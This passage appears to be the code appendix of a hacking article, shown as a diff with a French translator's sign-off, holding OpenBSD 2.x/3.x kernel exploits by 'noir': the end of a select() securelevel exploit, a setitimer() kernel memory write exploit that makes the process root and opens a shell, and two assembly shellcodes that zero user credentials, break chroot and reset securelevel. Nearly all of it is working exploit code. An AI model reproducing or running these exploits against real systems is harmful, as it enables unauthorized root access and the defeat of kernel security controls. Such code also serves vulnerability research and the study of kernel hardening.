+   u_long pgsz, *lptr, secladr;
+
+	if(!argv[1]) {
+	printf("Usage: %s secl_addr\nsecl_addr: /usr/bin/nm /bsd |"
+       	" grep _securelevel\n", argv[0]);
+	exit(0);
+	}
+
+	secladr = strtoul(argv[1], NULL, 16);
+
+  	 pgsz = sysconf(_SC_PAGESIZE);
+	 fptr = buf = (char *) malloc(pgsz*4);
+	 if(!buf) {
+		    perror("malloc");
+		    exit(-1);
+		 }
+	 memset(buf, 0x41, pgsz*4);
+
+	buf = (char *) (((u_long)buf & ~pgsz) + pgsz);
+
+	ptr = (char *) (buf + pgsz - 200); /* userland adr */
+	lptr = (long *) (buf + pgsz - 8);
+
+	*lptr++ = 0x12345678; /* saved %ebp */
+	*lptr++ = (u_long) ptr; /*(uadr + 0x1ec0);  saved %eip */
+
+	shellcode[5] = secladr & 0xff;
+	shellcode[6] = (secladr >> 8) & 0xff;
+	shellcode[7] = (secladr >> 16) & 0xff;
+	shellcode[8] = (secladr >> 24) & 0xff;
+
+	memcpy(ptr, shellcode, sizeof(shellcode)-1);
+
+	if( mprotect((char *) ((u_long) buf + pgsz), (size_t)pgsz,
+					 PROT_WRITE) < 0) {
+		perror("mprotect");
+		exit(-1);
+	}
+
+	signal(SIGSEGV, (void (*)())sig_handler);
+	select(0x80000000, (fd_set *) ptr, NULL, NULL, NULL);
+
+done:
+	free(fptr);
+}
+
+void
+sig_handler()
+{
+   exit(0);
+}
+<--> ./ex_kernel/ex_select_obsd_secl.c
+<++> ./ex_kernel/ex_setitimer_obsd.c
+/**
+** OpenBSD 2.x 3.x setitimer() kernel memory write exploit
+** Sinan "noir" Eren
+** noir@olympos.org | noir@uberhax0r.net
+** (c) 2002
+**
+**/
+
+#include <stdio.h>
+#include <sys/param.h>
+#include <sys/proc.h>
+#include <sys/time.h>
+#include <sys/sysctl.h>
+
+
+struct itimerval val, oval;
+int which = 0;
+
+int
+main(int argc, char **argv)
+{
+   find_which();
+   setitimer(which, &val, &oval);
+   seteuid(0);
+   setuid(0);
+   printf("uid: %d euid: %d gid: %d \n", getuid(), geteuid(), getgid());
+   execl("/bin/sh", "noir", NULL);
+}
+
+find_which()
+{
+   unsigned int arr[4], len;
+   struct kinfo_proc kp;
+   long stat, cred, rem;
+
+	memset(&val, 0x00, sizeof(val));
+	val.it_interval.tv_sec = 0x00;  //fill this with cr_ref
+	val.it_interval.tv_usec = 0x00;
+	val.it_value.tv_sec = 0x00;
+	val.it_value.tv_usec = 0x00;
+
+	arr[0] = CTL_KERN;
+	arr[1] = KERN_PROC;
+	arr[2] = KERN_PROC_PID;
+	arr[3] = getpid();
+	len = sizeof(struct kinfo_proc);
+	if(sysctl(arr, 4, &kp, &len, NULL, 0) < 0) {
+		perror("sysctl");
+		fprintf(stderr, "this is an unexpected error, rerun!\n");
+		exit(-1);
+	}
+
+	printf("proc: %p\n\n", (u_long) kp.kp_eproc.e_paddr);
+	printf("pc_ucred: %p ", (u_long) kp.kp_eproc.e_pcred.pc_ucred);
+
+	printf("p_ruid: %d\n\n", (u_long) kp.kp_eproc.e_pcred.p_ruid);
+	printf("proc->p_cred->p_ruid: %p, proc->p_stats: %p\n",
+	(char *) (kp.kp_proc.p_cred) + 4, kp.kp_proc.p_stats);
+        printf("cr_ref: %d\n", (u_long) kp.kp_eproc.e_ucred.cr_ref);
+
+	cred = (long) kp.kp_eproc.e_pcred.pc_ucred;
+	stat = (long) kp.kp_proc.p_stats;
+	val.it_interval.tv_sec = kp.kp_eproc.e_ucred.cr_ref;
+
+	printf("calculating which for u_cred:\n");
+	which = cred - stat - 0x90;
+	rem = ((u_long)which%0x10);
+	printf("which: %.8x reminder: %x\n", which, rem);
+
+	switch(rem) {
+	case 0x8:
+	case 0x4:
+	case 0xc:
+         break;
+	case 0x0:
+	 printf("using u_cred, we will have perminent euid=0\n");
+	 goto out;
+	}
+
+	val.it_interval.tv_sec = 0x00;
+	cred = (long) ((char *) kp.kp_proc.p_cred+4);
+	stat = (long) kp.kp_proc.p_stats;
+
+	printf("calculating which for u_cred:\n");
+	which = cred - stat - 0x90;
+	rem = ((u_long)which%0x10);
+	printf("which: %.8x reminder: %x\n", which, rem);
+
+	switch(rem) {
+	case 0x8:
+	case 0x4:
+	 printf("too bad rem is fucked!\nlet me know about this!!\n");
+         exit(0);
+	case 0x0:
+	 break;
+	case 0xc:
+	 which += 0x10;
+	}
+	printf("\nusing p_cred instead of u_cred, only the new process "
+	       "will be priviliged\n");
+
+out:
+	which = which >> 4;
+	printf("which: %.8x\n", which);
+	printf("addr to overwrite: %.8x\n", stat + 0x90 + (which * 0x10));
+}
+<--> ./ex_kernel/ex_setitimer_obsd.c
+<++> ./ex_kernel/kernel_sc.s
+# kernel level shellcode
+# noir@olympos.org |  noir@uberhax0r.net
+# 2002
+.text
+	.align 2,0x90
+
+.globl _main
+	.type	_main , @function
+_main:
+
+call moo
+.long 0x12345678
+.long 0xdeadcafe
+.long 0xbeefdead
+nop
+nop
+nop
+moo:
+pop  %edi
+mov  (%edi),%ecx      # parent's proc addr on ecx
+
+# update p_cred->p_ruid
+mov  0x10(%ecx),%ebx  # ebx = p_cred
+xor  %eax,%eax        # eax = 0
+mov  %eax,0x4(%ebx)
+# p_ruid = 0
+
+# update pc_ucred->cr_uid
+mov  (%ebx),%edx      # edx = pc_ucred
+mov  %eax,0x4(%edx)
+# cr_uid = 0
+
+# update p_fd->fd_rdir to break chroot()
+mov  0x14(%ecx),%edx # edx = p_fd
+mov  %eax,0xc(%edx)
+# p_fd->fd_rdir = 0
+
+lea  0x68(%esp),%ebp
+# set ebp to normal
+
+# find where to return: sidt technique
+sidt 0x4(%edi)
+mov  0x6(%edi),%ebx   # mov _idt_region in eax
+mov  0x400(%ebx),%edx # _idt_region[0x80 * (2*long) = 0x400]
+mov  0x404(%ebx),%ecx # _idt_region[0x404]
+shr  $0x10,%ecx
+sal  $0x10,%ecx
+sal  $0x10,%edx
+shr  $0x10,%edx
+or   %ecx,%edx        # edx = ecx | edx; _Xosyscall_end
+
+# search for Xosyscall_end+XXX: call _syscall instruction
+
+xor  %ecx,%ecx
+up:
+inc  %ecx
+movb (%edx,%ecx),%bl
+cmpb $0xe8,%bl
+jne  up
+
+lea  (%edx,%ecx),%ebx # _Xosyscall_end+%ecx: call _syscall
+inc  %ecx
+mov  (%edx,%ecx),%ecx # take the displacement of the call ins.
+add  $0x5,%ecx        # add 5 to displacement
+add  %ebx,%ecx        # ecx = _Xosyscall_end+0x20 + disp
+
+# search for _syscall+0xXXX: call *%eax
+# and return to where we were supposed to!
+# _syscall+0x240: ff
+# _syscall+0x241: d0	0x240,0x241 on obsd3.1
+
+mov  %ecx,%edi         # ecx is addr of _syscall
+movw $0xd0ff,%ax
+cld
+mov  $0xffffffff,%ecx
+repnz
+scasw    #scan (%edi++) for %ax
+
+#return to *%edi
+xor  %eax,%eax  #set up the return value to Success ;)
+push %edi
+ret
+<--> ./ex_kernel/kernel_sc.s
+<++> ./ex_kernel/secl_sc.s
+# securelevel reset shellcode
+# noir@olympos.org |  noir@uberhax0r.net
+# 2002
+.text
+	.align 2,0x90
+.globl _main
+	.type	_main , @function
+_main:
+call moo
+.long 0x12345678
+moo:
+pop  %edi
+mov  (%edi),%ebx      # address of securelevel
+
+xor  %eax,%eax        # eax = 0
+mov  %eax,(%ebx)
+# securelevel = 0
+
+lea  0x68(%esp),%ebp
+# set ebp to normal
+
+# find where to return: sidt technique
+sidt 0x4(%edi)
+mov  0x6(%edi),%ebx   # mov _idt_region in eax
+mov  0x400(%ebx),%edx # _idt_region[0x80 * (2*long) = 0x400]
+mov  0x404(%ebx),%ecx # _idt_region[0x404]
+shr  $0x10,%ecx
+sal  $0x10,%ecx
+sal  $0x10,%edx
+shr  $0x10,%edx
+or   %ecx,%edx        # edx = ecx | edx; _Xosyscall_end
+
+# search for Xosyscall_end+XXX: call _syscall instruction
+
+xor  %ecx,%ecx
+up:
+inc  %ecx
+movb (%edx,%ecx),%bl
+cmpb $0xe8,%bl
+jne  up
+
+lea  (%edx,%ecx),%ebx # _Xosyscall_end+%ecx: call _syscall
+inc  %ecx
+mov  (%edx,%ecx),%ecx # take the displacement of the call ins.
+add  $0x5,%ecx        # add 5 to displacement
+add  %ebx,%ecx        # ecx = _Xosyscall_end+0x20 + disp
+
+# search for _syscall+0xXXX: call *%eax
+# and return to where we were supposed to!
+# _syscall+0x240: ff
+# _syscall+0x241: d0	OBSD3.1
+
+mov  %ecx,%edi         # ecx is addr of _syscall
+movw $0xd0ff,%ax
+cld
+mov  $0xffffffff,%ecx
+repnz
+scasw    #scan (%edi++) for %ax
+
+#return to *%edi
+xor  %eax,%eax  #set up the return value to Success ;)
+push %edi
+ret
+<--> ./ex_kernel/secl_sc.s
+
+|=[ EOF ]=---------------------------------------------------------------=|
+
+
+Traduction par [DegenereScience]DecereBrain, le 12 Fevrier 2003, 19:25
+(Bientot la Saint Valentin. Leo, je pense a toi.)
+Dedicace a OUAH
+
